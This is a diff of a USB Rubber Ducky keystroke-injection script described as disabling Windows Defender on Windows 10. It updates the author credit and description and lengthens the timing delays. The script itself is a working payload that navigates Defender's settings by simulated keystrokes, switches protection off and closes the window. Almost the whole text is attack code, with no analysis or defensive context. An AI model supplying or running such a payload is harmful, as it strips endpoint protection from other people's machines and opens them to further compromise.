@@ -1,5 +1,5 @@
-REM Author      : https://github.com/Lizard640
-REM Description : Disable Windows Defender on Windows 10 And opens powershell admin rights
+REM Author      : https://github.com/Knoxoxen
+REM Description : Disable Windows Defender on Windows 10
 
 DELAY 1000
 REM Open Windows Defender settings
@@ -17,31 +17,31 @@ DELAY 1000
 TAB
 DELAY 1000
 TAB
-DELAY 250
+DELAY 700
 DOWNARROW
 DELAY 1000
 ENTER
 DELAY 1000
 TAB
-DELAY 250
+DELAY 700
 TAB
-DELAY 250
+DELAY 700
 TAB
-DELAY 250
+DELAY 700
 TAB
-DELAY 250
+DELAY 700
 TAB
-DELAY 250
+DELAY 700
 ENTER
-DELAY 250
+DELAY 700
 SPACE
-DELAY 250
+DELAY 700
 TAB
-DELAY 250
+DELAY 700
 TAB
-DELAY 250
+DELAY 700
 TAB
-DELAY 250
+DELAY 700
 ENTER
-DELAY 250
+DELAY 700
 ALT F4
